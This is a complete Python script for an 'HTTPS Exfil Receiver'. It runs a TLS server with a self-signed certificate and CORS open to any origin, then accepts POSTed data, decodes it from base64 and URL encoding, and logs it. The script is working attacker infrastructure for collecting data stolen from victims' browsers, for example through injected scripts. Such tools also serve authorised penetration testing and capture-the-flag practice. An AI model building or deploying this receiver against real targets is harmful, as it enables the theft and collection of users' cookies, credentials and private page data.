from http import server
import ssl
import base64
import urllib.parse
import subprocess
import argparse
import os
from datetime import datetime
from rich.console import Console
from rich.markup import escape

LOG_FILE = "server.log"
console = Console(highlight=False)
seen_posts: set[str] = set()
skipped_dupes: int = 0


def try_decode_exfil(raw: str) -> str | None:
    try:
        decoded_bytes = base64.b64decode(raw)
        decoded_str = decoded_bytes.decode("utf-8")
        return urllib.parse.unquote(decoded_str)
    except Exception:
        return None

def log_to_file(msg: str):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now().isoformat()}] {msg}\n")

def ts():
    return datetime.now().strftime("%H:%M:%S")


class CustomRequestHandler(server.SimpleHTTPRequestHandler):
    def end_headers(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        super().do_GET()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        self._post_body = body
        self.send_response(200)
        self.end_headers()

    def log_request(self, code="-", size="-"):
        status = int(code) if str(code).isdigit() else 0
        client = self.client_address[0]
        method = self.command

        log_to_file(f"{method} {self.path} {code} from {client}")

        if method == "OPTIONS":
            return

        global skipped_dupes
        body = getattr(self, "_post_body", None)
        if method == "POST" and not body:
            return
        if body:
            raw = body.decode("utf-8", errors="replace")
            self._post_body = None
            if raw in seen_posts:
                skipped_dupes += 1
                log_to_file(f"POST body (duplicate): {raw}")
                return

        mc = {"POST": "magenta", "GET": "cyan", "PUT": "yellow", "DELETE": "red"}.get(method, "white")

        if skipped_dupes:
            console.print(f"  [dim]\\[*] Skipped {skipped_dupes} duplicate payload(s)[/dim]")
            skipped_dupes = 0

        if status >= 400:
            sc = "red" if status >= 500 else "yellow"
            console.print(f"  [{sc}]\\[HTTPS][/{sc}] [{mc}]{method} {self.path}[/{mc}] [dim]from[/dim] {client} [{sc}]({status})[/{sc}]")
        else:
            console.print(f"  [green]\\[HTTPS][/green] [{mc}]{method} {self.path}[/{mc}] [dim]from[/dim] {client}")

        if not body:
            return

        seen_posts.add(raw)
        decoded = try_decode_exfil(raw)

        console.print(f"  [green]\\[HTTPS][/green] [dim]Raw     :[/dim] [cyan]{escape(raw)}[/cyan]")
        log_to_file(f"POST body (raw): {raw}")

        if decoded:
            console.print(f"  [green]\\[HTTPS][/green] [yellow]Decoded :[/yellow] [green]{escape(decoded)}[/green]")
            log_to_file(f"POST body (decoded): {decoded}")

    def log_message(self, format, *args):
        pass


def ensure_cert(path):
    if os.path.exists(path):
        return
    console.print(f"  [yellow]\\[*][/yellow] No cert found, generating {path} ...")
    subprocess.run([
        "openssl", "req", "-x509", "-newkey", "rsa:2048",
        "-keyout", path, "-out", path,
        "-days", "365", "-nodes", "-subj", "/CN=localhost",
    ], check=True, capture_output=True)
    console.print(f"  [green]\\[+][/green] Done.")

def print_banner(host, port, cert):
    console.print()
    console.print(f"  [green]\\[+][/green] HTTPS Exfil Receiver")
    console.print(f"  [green]\\[+][/green] Address : https://{host}:{port}")
    console.print(f"  [green]\\[+][/green] Cert    : {cert}")
    console.print(f"  [green]\\[+][/green] Logfile : ./{LOG_FILE}")
    console.print(f"  [green]\\[+][/green] Serving : ./")
    console.print(f"  [green]\\[+][/green] Listening for events...\n")

if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="HTTPS exfil receiver")
    ap.add_argument("-p", "--port", type=int, default=4443)
    ap.add_argument("-b", "--bind", default="0.0.0.0")
    ap.add_argument("-c", "--cert", default="server.pem")
    args = ap.parse_args()

    ensure_cert(args.cert)
    print_banner(args.bind, args.port, args.cert)
    log_to_file(f"Server started on https://{args.bind}:{args.port}")

    httpd = server.HTTPServer((args.bind, args.port), CustomRequestHandler)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=args.cert)
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
    httpd.serve_forever()
